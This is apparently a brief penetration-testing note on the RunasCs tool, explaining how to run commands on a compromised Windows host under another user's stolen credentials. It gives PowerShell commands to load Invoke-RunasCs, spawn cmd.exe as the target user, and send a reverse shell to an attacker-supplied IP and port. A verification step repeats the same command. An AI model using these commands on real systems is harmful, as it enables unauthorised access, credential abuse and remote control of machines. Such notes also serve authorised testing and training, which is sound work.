[RunasCs](https://github.com/antonioCoco/RunasCs) is used in post-exploitation when you already have a reverse shell on a Windows machine and obtain valid credentials for another user in the system or domain. In many hardened environments, remote authentication methods such as RDP, SMB execution, or WinRM are not available, so you cannot simply log in as the new user. **RunasCs** solves this by allowing you to execute commands locally under the identity of the compromised credentials, effectively switching execution context without requiring a new network session.

It is not a remote access tool, but a local process execution mechanism that leverages valid credentials to spawn a new shell or payload as another user.

---

## Basic Command Execution
Import the module.

```powershell
. .\Invoke-RunasCs.ps1
```

The most direct usage is spawning a command shell as the target user.

```bash
Invoke-RunasCs <domain>\\<user> <password> "cmd.exe"
```

This opens a new shell running under `user`, which can be verified immediately.

```bash
Invoke-RunasCs <domain>\\<user> <password> "cmd.exe"
```

---

## Reverse Shell Under New User Context

In real exploitation chains, **RunasCs** is typically used to trigger a callback rather than interact with a local shell.

```powershell
Invoke-RunasCs -Username <user> -Password <password> -Command cmd.exe -Remote <ip>:<port>
```

This results in a reverse shell executing as the second user, not the original compromised account.


